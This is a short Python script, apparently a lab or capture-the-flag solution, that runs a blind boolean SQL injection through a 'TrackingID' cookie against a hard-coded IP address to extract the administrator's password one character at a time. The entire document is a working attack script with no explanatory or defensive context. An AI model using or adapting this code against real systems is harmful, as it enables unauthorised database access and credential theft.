import requests
from string import ascii_letters, digits

url = "http://178.128.112.149/5_advance/"

password = ""
payload = ""
idx = 1
while True:
    for char in ascii_letters + digits:
        payload = password + char
        injection = f"aW5kb25lc2lh' AND (SELECT SUBSTRING(password,{idx},1) FROM users WHERE username='administrator')='{payload}'--"
        res = requests.get(url, cookies={"TrackingID": injection}).text
        print(injection)
        if "Selamat Datang" in res:
            password += char
            print(password)
            idx += 1
            break
    else:
        break
